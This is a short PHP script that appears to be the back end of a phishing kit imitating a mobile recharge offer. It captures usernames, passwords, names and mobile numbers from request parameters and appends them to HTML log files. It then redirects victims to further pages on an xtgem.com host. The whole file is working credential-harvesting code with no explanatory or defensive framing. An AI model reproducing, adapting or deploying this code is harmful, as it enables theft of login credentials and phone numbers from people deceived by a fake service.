<?php 

if(isset($_GET['log'])){
	$uname=$_GET['uname'];
	$pass=$_GET['pass'];
	$date = date("d F Y h:i:s A");
	in_lognew($uname,$pass,$date);
	header ('Location: http://frecharge003.xtgem.com/enter_mobile.php');
}
if(isset($_GET['ph'])){
	$name=$_GET['name'];
	$pass=$_GET['ph'];
	in_phnew($name,$pass);
	header ('Location: http://frecharge003.xtgem.com/end.php');
}

function in_lognew($username,$password,$date){
$file=fopen("log.html","a+");

//echo $fl;
$str="u={$username}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p={$password}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d={$date}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	<input value='{$username}-hmd-{$password}'><hr>";
fwrite($file,$str);
}
function in_phnew($name,$mobile){
$file=fopen("ph.html","a+");

//echo $fl;
$str="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name={$name}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mobile={$mobile}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<hr>";
fwrite($file,$str);
}
?>